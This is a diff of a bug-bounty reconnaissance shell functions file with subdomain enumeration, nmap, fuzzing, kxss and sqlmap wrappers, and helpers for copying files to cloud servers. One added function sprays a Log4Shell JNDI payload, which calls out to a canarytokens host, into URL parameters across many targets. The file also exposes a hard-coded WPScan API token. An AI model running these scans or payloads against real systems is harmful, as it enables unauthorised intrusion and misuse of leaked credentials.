@@ -10,7 +10,8 @@ gall(){
     find . -type f -name $1 | xargs -n1 -I{} cat {} | sort -u
 }
 arg(){
-    cat $1 | awk '{print $NF"    "$1}' | grep http | tr -d '[]' | sort -n | vi -
+    cat $1 | awk '{print $NF"   "$1" "$(NF-1)}' | tr -d '[]' | sort -u | sort -n > sorted
+    uniqurls.py $1 | sort -u | sort -n > uniq
 }
 
 see-buckets(){
@@ -54,11 +55,7 @@ getroot(){
 	cat $1 | rev | cut -d "." -f 1,2 | rev | sort -u | tee -a root-$1
 }
 getintresting(){
-	words=("uat" "test" "prod" "admin" "stag" "jenkins" "jankins" "jire" "jira" "smal" "auth" "outh")
-	for i in "${words[@]}"
-	do
-		cat $1 | grep $i
-	done | sort -u | tee -a potential-$1
+		cat $1 | grep -aiE 'uat|test|prod|admin|stag|jenkins|jankins|jire|jira|smal|auth|outh|corp|api|v1|test' | tee -a potential-$1
 }
 server(){
     python3 -m http.server $1
@@ -83,7 +80,7 @@ brutelist(){
     cat $1 | xargs -n1 -P4 -I{} shuffledns -w ~/tools/SecLists/Discovery/DNS/dns-Rocky.txt -d {} -silent -r ~/tools/tools/files/resolvers.txt
 }
 brute(){
-    cat $1 | xargs -n1 -I{} sh -c "cat $2 | grep {} | shuffledns -d {} -r ~/tools/tools/files/resolvers.txt -silent" | tee -a $3
+    cat $1 | xargs -n1 -I{} sh -c "cat $2 | grep {}$ | shuffledns -d {} -r ~/tools/tools/files/resolvers.txt -silent" | tee -a $3
 }
 bruteall(){
 	for i in $(cat $1)
@@ -101,7 +98,7 @@ aqua(){
 
 #-----------------port-snanning--------------------------------------
 nm(){
-	sudo nmap -T4 -Pn -v -sC $1
+	sudo nmap -T4 -Pn -v -sV -sC $1
 }
 nms(){
 	sudo nmap -T4 --script=http-title -v -Pn -oN nmap-$1 $1
@@ -157,9 +154,6 @@ recon(){
     #amass
     cat $1 | xargs -n1 -P2 -I{} sh -c "amass enum -passive -nolocaldb -nocolor -config ~/tools/amass/config.ini -d {}" | anew domains
 
-    #findomain
-	cat $1 | xargs -n1 -P4 -I{} findomain -q -t {} | anew domains
-
     #clean domains
     sanitizer.py $1 domains | sort -u > t
     rm domains
@@ -170,9 +164,7 @@ recon(){
 
     #recon on third-level-domains
     cat third-level-domains | xargs -n1 -P10 -I{} recon.py {} | anew domains
-	cat third-level-domains | xargs -n1 -P10 -I{} findomain -q -t {} | anew domains
     cat third-level-domains | xargs -n1 -P10 -I{} subfinder -silent -d {} | anew domains
-    cat third-level-domains | xargs -n1 -P2 -I{} sh -c "amass enum -passive -nolocaldb -nocolor -config ~/tools/amass/config.ini -d {}" | anew domains
     
     #clean domains
     sanitizer.py $1 domains | sort -u > t
@@ -192,7 +184,7 @@ rlist(){
     cat $1 | xargs -n1 -P4 -I{} recon.py {}
 }
 am(){
-    cat $1 | xargs -n1 -P3 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
+    cat $1 | xargs -n1 -P5 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
 }
 takeover(){
     cd ~/tools/SubOver/
@@ -203,10 +195,7 @@ param(){
     arjun -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
 }
 fuzz(){
-    for i in $(cat $1)
-    do
-        python3 ~/tools/dirsearch/dirsearch.py -u $i -w /home/rocky/tools/tools/files/dict.txt -t 200 --no-color -q -H 'X-Forwarded-For: 127.0.0.1' --skip-on-status 429 -r -R 3
-    done | tee -a directories
+    ffuf -u $1 -w ~/tools/tools/files/dict.txt -t 200 -H "X-Forwarded-For: 127.0.0.1" -D -e .html,.json -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
 }
 jshunter(){
     cat $1 | httpx -fl 0 -mc 200 -content-length -sr -srd scripts/ -silent -no-color -o jsindex
@@ -244,29 +233,31 @@ enum(){
     #clean domains
     sanitizer.py root domains | sort -u > t
     rm domains
-    mv t domains
+    removeroot.py t > domains
+    rm t
 
-    #get bruteable domains
-    bruteable.py 4 domains | rev | cut -d '.' -f1,2,3,4 | rev | sort -u > to-brute #bruteforce these later
-    
     #get alive
     cat domains | dnsx -resp -o resp -silent
-    cat resp | awk '{print $1}' | sort -u > dns
-    cat resp | awk '{print $2}' | tr -d '[]' | sort -u > ip_addresses
-
-    #get active domains
-    cat domains | httpx -silent -o active-domains
+    cat resp | awk '{print $1}' | sort -u | anew dns
+    cat resp | awk '{print $2}' | tr -d '[]' | sort -u > ips
+    clean_ips.py ips | anew ip_addresses
 
     #get data on active domains
-    hunter.py active-domains
-
+    hunter.py --no-redirect -p 443,8443,4443,8080,8000,80 -t 20 -timeout 10 domains
+    
+    #get active-domains
+    cat out/index | awk '{print $1}' | sort -u > active-domains
+    
+    #wayback machine
+    echo '[*]Starting geturls.py'
+    urls active-domains
+    
     #jshunter on jsfiles
+    echo '[*]Starting jshunter'
     cd out/
+    cat ../urls | grep -a '\.js' | grep -vaE '\.json|\.jsp' | anew jsfiles
     jshunter jsfiles
     cd ..
-
-    #wayback machine
-    urls active-domains
 }
 struds(){
     cat $1 | httpx -path '/sm/login/loginpagecontentgrabber.do' -threads 100 -random-agent -x GET -title -tech-detect -status-code  -follow-redirects -title -mc 200 -no-color -content-length -o $2 
@@ -281,7 +272,7 @@ sjack(){
     subjack -w $1 -t 100 -timeout 30 -c ~/tools/subjack/fingerprints.json -ssl
 }
 reconpad(){
-    ssh -i "~/tools/server/reconpad.pem" ubuntu@35.154.79.99
+    ssh -i "~/tools/server2/reconpad.pem" ubuntu@3.133.52.79
 }
 checkey(){
     cat ~/bounty/maps-urls | sed "s/KEY_HERE/$1/g"
@@ -290,10 +281,10 @@ sdns(){
     shuffledns -d $1 -w $2 -r ~/tools/tools/files/resolvers.txt -strict-wildcard -silent
 }
 sendr(){
-    scp -i "~/tools/server/reconpad.pem" $1 ubuntu@35.154.79.99:/home/ubuntu/$2
+    scp -i "~/tools/server2/reconpad.pem" $1 ubuntu@3.133.52.79:/home/ubuntu/$2
 }
 recvr(){
-    scp -i "~/tools/server/reconpad.pem" ubuntu@35.154.79.99:/home/ubuntu/$1 $2
+    scp -i "~/tools/server2/reconpad.pem" ubuntu@3.133.52.79:/home/ubuntu/$1 $2
 }
 fp(){
     find . -name $1 | xargs -n1 -I{} cat {} | sort -u
@@ -317,7 +308,7 @@ xss(){
     then
         echo "need two arguments"
     else
-        cat $1 | grep '=' | grep -vE "\.(gif|jpeg|css|tif|tiff|png|woff|jpg|ico|pdf|svg|txt|js)" | uro | sort -u | kxss | tee -a $2 
+        cat $1 | grep -a '=' | grep -vaE "\.(gif|jpeg|css|tif|tiff|png|woff|jpg|ico|pdf|svg|txt|js)" | kxss | tee -a $2 
     fi
 }
 sqli(){
@@ -330,14 +321,69 @@ sqli(){
     fi
 }
 fuzzer(){
-    ssh -i "~/tools/server/fuzzer.pem" ubuntu@13.127.225.24
+    ssh -i "~/tools/server/fuzzer.pem" ubuntu@65.0.165.157
 }
 sendf(){
-     scp -i "~/tools/server/fuzzer.pem" $1 ubuntu@13.127.225.24:/home/ubuntu/$2
+     scp -i "~/tools/server/fuzzer.pem" $1 ubuntu@65.0.165.157:/home/ubuntu/$2
 }
 recvf(){
-    scp -i "~/tools/server/fuzzer.pem" ubuntu@13.127.225.24:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/fuzzer.pem" ubuntu@65.0.165.157:/home/ubuntu/$1 $2
 }
 dork-root(){
     echo -n site:*.;join.py $1 | sed 's/,/ | site:*./g'
+}
+whm(){
+    sudo python3 ~/tools/tools/whois-man.py $1
+}
+sqlm(){
+    python3 ~/tools/sqlmap/sqlmap.py -u $1 --risk 2 --dbs --batch $2 $3 $4 $5
+}
+bounty(){
+    ssh -i "~/tools/server/bounty.pem" ubuntu@13.232.170.202
+}
+sendb(){
+    scp -i "~/tools/server/bounty.pem" $1 ubuntu@13.232.170.202:/home/ubuntu/$2
+}
+recvb(){
+    scp -i "~/tools/server/bounty.pem" ubuntu@13.232.170.202:/home/ubuntu/$1 $2
+}
+asn(){
+    curl -s "http://asnlookup.com/api/lookup?org=$1" | jq -r '.[]'
+}
+scanner(){
+    ssh -i "~/tools/server/scanner.pem" ubuntu@13.235.151.209
+}
+sends(){
+    scp -i "~/tools/server/scanner.pem" $1 ubuntu@13.235.151.209:/home/ubuntu/$2
+}
+recvs(){
+    scp -i "~/tools/server/scanner.pem" ubuntu@13.235.151.209:/home/ubuntu/$1 $2
+}
+hx(){
+    cat $1 | httpx -status-code -content-length -title -no-color -silent -location
+}
+ver(){
+    cd /home/rocky/recondata/verizonmedia/main/03-10-21
+}
+wps(){
+    wpscan --url $1 --api-token 8GcfjAzhd9MApKYaAHNHDJHnJzpCKTHxaNrrvy99dmI
+}
+sort-index(){
+    cat $1 | awk '{print $NF"  "$1"  "$(NF-1)}' | tr -d '[]' | sort -u | sort -n
+}
+y(){
+    cd /home/rocky/recondata/verizonmedia/yahoo/23-10-21
+}
+roos(){
+    join.py $1 | sed 's/,/|/g' | xargs -n1 -I{} sh -c "cat $2 | grep -avE '^({})$'"
+}
+u(){
+    sudo apt -y update && sudo apt -y upgrade
+}
+wifix(){
+    sudo rmmod mt76x0e
+    sudo modprobe mt76x0e
+}
+log4j(){
+    cat $1 | grep = | qsreplace '${jndi:ldap://x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}' | grep -vE 'www|join|invite|==' | urldedupe -s | httpx
 }
